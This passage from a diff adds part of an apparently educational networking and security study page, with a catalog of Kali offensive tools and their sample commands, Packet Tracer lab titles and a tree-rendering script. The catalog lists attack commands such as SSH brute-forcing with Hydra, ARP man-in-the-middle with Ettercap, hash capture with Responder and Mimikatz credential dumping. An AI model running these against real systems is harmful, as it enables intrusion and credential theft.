+          { name: "Maltego", payload: "maltego", tool: "OSINT Graphing", defense: "N/A", desc: "Graphical link analysis for OSINT gathering." },
+          { name: "Recon-ng", payload: "recon-ng", tool: "Web Recon", defense: "N/A", desc: "Full-featured web reconnaissance framework." },
+          { name: "theHarvester", payload: "theHarvester -d target.com -b google", tool: "Email/Subdomain", defense: "N/A", desc: "Gather emails, subdomains, and employee names." },
+          { name: "Shodan", payload: "shodan search apache", tool: "Search Engine", defense: "N/A", desc: "Search engine for Internet-connected devices." }
+        ]},
+        { id: "kali_web", title: "Web Application Tools", type: "catalog", data: [
+          { name: "Burp Suite", payload: "burpsuite &", tool: "Web Proxy", defense: "N/A", desc: "Graphical tool to intercept and modify web traffic." },
+          { name: "OWASP ZAP", payload: "zap-cli quick-scan http://target", tool: "Web Scanner", defense: "N/A", desc: "Open-source alternative to Burp Suite." },
+          { name: "SQLmap", payload: "sqlmap -u 'http://target?id=1' --dump", tool: "SQLi Automation", defense: "N/A", desc: "Automates the detection and exploitation of SQLi." },
+          { name: "Nikto", payload: "nikto -h http://target", tool: "Web Server Scanner", defense: "N/A", desc: "Scans for dangerous files and outdated software." },
+          { name: "Gobuster", payload: "gobuster dir -u http://target -w wordlist", tool: "Directory Brute-force", defense: "N/A", desc: "Finds hidden directories and files." }
+        ]},
+        { id: "kali_exploit", title: "Exploitation Frameworks", type: "catalog", data: [
+          { name: "Metasploit", payload: "msfconsole", tool: "Exploitation", defense: "N/A", desc: "The industry standard for exploit development and execution." },
+          { name: "Searchsploit", payload: "searchsploit apache 2.4", tool: "Exploit DB", defense: "N/A", desc: "Command line search for Exploit-DB." },
+          { name: "BeEF", payload: "./beef", tool: "Browser Exploit", defense: "N/A", desc: "Focuses on the web browser to launch client-side attacks." },
+          { name: "SET", payload: "setoolkit", tool: "Social Engineering", defense: "N/A", desc: "Framework for phishing and social engineering attacks." }
+        ]},
+        { id: "kali_password", title: "Password Cracking", type: "catalog", data: [
+          { name: "Hashcat", payload: "hashcat -m 1000 hash.txt rockyou.txt", tool: "GPU Cracker", defense: "Use strong passwords.", desc: "World's fastest password cracker using GPU." },
+          { name: "John the Ripper", payload: "john --wordlist=rockyou.txt hashes.txt", tool: "CPU Cracker", defense: "Use strong passwords.", desc: "Autodetects and cracks password hashes." },
+          { name: "Hydra", payload: "hydra -l admin -P rockyou.txt ssh://10.10.10.5", tool: "Online Brute-force", defense: "Lockout policies.", desc: "Fast network logon cracker." },
+          { name: "Medusa", payload: "medusa -h 10.10.10.5 -u admin -P rockyou.txt -M ssh", tool: "Online Brute-force", defense: "Lockout policies.", desc: "Parallel network logon cracker." }
+        ]},
+        { id: "kali_sniff", title: "Sniffing & Spoofing", type: "catalog", data: [
+          { name: "Wireshark", payload: "tshark -i eth0", tool: "Packet Analyzer", defense: "Encryption (HTTPS/SSH).", desc: "Interactively dump and analyze network traffic." },
+          { name: "Bettercap", payload: "bettercap -iface eth0", tool: "MITM", defense: "Static ARP, HTTPS.", desc: "Powerful, flexible tool to perform MITM attacks." },
+          { name: "Ettercap", payload: "ettercap -T -M arp /target// /gateway//", tool: "MITM", defense: "Static ARP, HTTPS.", desc: "Comprehensive suite for man-in-the-middle attacks." },
+          { name: "Responder", payload: "responder -I eth0 -wrf", tool: "LLMNR/NBT-NS Poisoner", defense: "Disable LLMNR/NBT-NS.", desc: "Answers NBT-NS queries to capture NTLMv2 hashes." }
+        ]},
+        { id: "kali_post", title: "Post-Exploitation", type: "catalog", data: [
+          { name: "Mimikatz", payload: "sekurlsa::logonpasswords", tool: "Credential Dumping", defense: "LSASS protection, LSA Protection.", desc: "Extracts plaintext passwords, hashes, and Kerberos tickets." },
+          { name: "BloodHound", payload: "Invoke-BloodHound -CollectionMethod All", tool: "AD Graphing", defense: "Audit AD ACLs.", desc: "Identifies complex attack paths in Active Directory." },
+          { name: "Evil-WinRM", payload: "evil-winrm -i 10.10.10.5 -u admin -p pass", tool: "WinRM Shell", defense: "Restrict WinRM access.", desc: "Ultimate WinRM shell for hacking." },
+          { name: "PowerSploit", payload: "Invoke-Mimikatz", tool: "PowerShell Framework", defense: "AMSI, Constrained Lang Mode.", desc: "PowerShell post-exploitation framework." }
+        ]},
+        { id: "kali_forensics", title: "Forensics & Stego", type: "catalog", data: [
+          { name: "Volatility", payload: "volatility -f mem.raw pslist", tool: "Memory Forensics", defense: "N/A", desc: "Extracts artifacts from memory dumps." },
+          { name: "Autopsy", payload: "autopsy &", tool: "Disk Forensics", defense: "N/A", desc: "GUI for The Sleuth Kit to analyze disk images." },
+          { name: "Binwalk", payload: "binwalk -e firmware.bin", tool: "Firmware Analyzer", defense: "N/A", desc: "Searches binary images for embedded files." },
+          { name: "Steghide", payload: "steghide extract -sf image.jpg", tool: "Steganography", defense: "N/A", desc: "Hides and extracts data in image/audio files." }
+        ]}
+      ]}
+    ];
+
+    // =========================================================
+    // DATA 4: Practice Labs Packet Tracer
+    // =========================================================
+    const data4 = [
+      {
+        title: "Practice Labs (Packet Tracer)", icon: "fa-network-wired",
+        children: [
+          "Basic Switch Configuration", 
+          "Basic VLAN Configuration", 
+          "Static Routing", 
+          "SSH Configuration", 
+          "VLAN Trunking", 
+          "Router-on-a-Stick", 
+          "EtherChannel", 
+          "DHCPv4 Configuration", 
+          "NAT Configuration", 
+          "Access Control Lists", 
+          "OSPF Routing", 
+          "HSRP Configuration", 
+          "Spanning Tree Protocol", 
+          "Switch Management", 
+          "VoIP — Cisco & Avaya", 
+          "Cloud — AWS / Azure / GCP", 
+          "Subnetting Practice", 
+          "Security ASA Firewall"
+        ]
+      }
+    ];
+
+    // =========================================================
+    // UNIFIED RENDER FUNCTION
+    // =========================================================
+    function renderTree(nodes, parentElement, level) {
+        nodes.forEach(node => {
+            // Handle string conversion
+            if (typeof node === 'string') {
+                node = { title: node, link: null, children: null };
+            }
+
+            const li = document.createElement('li');
+            li.className = `level-${level}`;
+
+            const itemElement = node.link ? document.createElement('a') : document.createElement('span');
+            itemElement.href = node.link || '#';
+            
+            // Determine title and icon
+            let title = node.cat || node.title || node.name;
+            let iconHtml = '';
+            if (level === 1) iconHtml = `<i class="fas ${node.icon || 'fa-folder'}" style="color: var(--primary); margin-right: 8px;"></i>`;
+            if (level > 1 && (node.children || node.modules || node.data)) iconHtml = `<i class="fas fa-chevron-right toggle-icon"></i>`;
+            if (level > 1 && !node.children && !node.modules && !node.data) iconHtml = `<i class="far fa-circle toggle-icon" style="font-size: 6px; color: var(--fg-muted);"></i>`;
+
+            itemElement.innerHTML = `${iconHtml} ${title}`;
+            li.appendChild(itemElement);
+
+            // Determine children array
+            const children = node.children || node.modules || node.data;
+
+            if (children && children.length > 0) {
+                const ul = document.createElement('ul');
+                ul.className = 'sub-tree';
+                renderTree(children, ul, level + 1);
+                li.appendChild(ul);
+
+                // Click event to toggle display block/none
+                itemElement.addEventListener('click', (e) => {
+                    if (e.target.tagName === 'A' && node.link) return; // Allow links to work
+                    e.preventDefault();
+                    itemElement.classList.toggle('expanded');
+                    ul.style.display = ul.style.display === 'block' ? 'none' : 'block';
+                });
+            } else if (!node.link) {
+                itemElement.style.cursor = 'default';
+            }
+            
+            parentElement.appendChild(li);
+        });
+    }
+
+    // Initialize All Trees
+    renderTree(data1, document.getElementById('tree1'), 1);
+    renderTree(data2, document.getElementById('tree2'), 1);
+    renderTree(data3, document.getElementById('tree3'), 1);
+    renderTree(data4, document.getElementById('tree4'), 1);
+
+    // Auto-expand the first level by default so the user sees the categories immediately
+    document.querySelectorAll('.level-1 > span').forEach(span => {
+        setTimeout(() => span.click(), 100);
+    });
+</script>
+</body>
+</html>
